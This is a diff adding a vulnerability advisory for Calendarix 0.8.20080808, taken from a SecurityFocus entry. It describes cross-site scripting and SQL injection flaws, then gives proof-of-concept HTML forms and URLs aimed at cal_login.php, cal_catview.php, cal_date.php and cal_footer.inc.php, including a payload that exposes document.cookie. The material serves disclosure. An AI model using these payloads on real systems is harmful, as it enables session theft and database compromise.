@@ -1,0 +1,27 @@
+source: http://www.securityfocus.com/bid/47790/info
+
+
+Calendarix is prone to multiple cross-site scripting vulnerabilities and an SQL-injection vulnerability because the application fails to sufficiently sanitize user-supplied input.
+
+Exploiting these issues could allow an attacker to steal cookie-based authentication credentials, compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database.
+
+Calendarix 0.8.20080808 is vulnerable; other versions may also be affected.
+
+
+<form action="http://www.example.com/cal_login.php?op=login" method="post" name="main" />
+<input type="hidden" name="login" value="&#039;SQL_CODE_HERE"/>
+<input type="hidden" name="password" value=""/>
+<input type="submit" value="submit"/>
+</form>
+
+http://www.example.com/cal_login.php/%27%3E%3Cscript%3Ealert%28123%29;%3C/script%3E
+
+<form action="http://www.example.com/cal_catview.php?catop=viewcat" method="post" name="main" />
+<input type="hidden" name="gocat" value="&#039;</script><script>alert(document.cookie);</script>"/>
+<input type="submit" value="submit"/>
+</form>
+
+
+http://www.example.com/cal_date.php?frmname=%3C/script%3E%3Cscript%3Ealert%28123%29;%3C/script%3E
+
+http://www.example.com/cal_footer.inc.php?leftfooter=%3Cscript%3Ealert%28123%29;%3C/script%3E
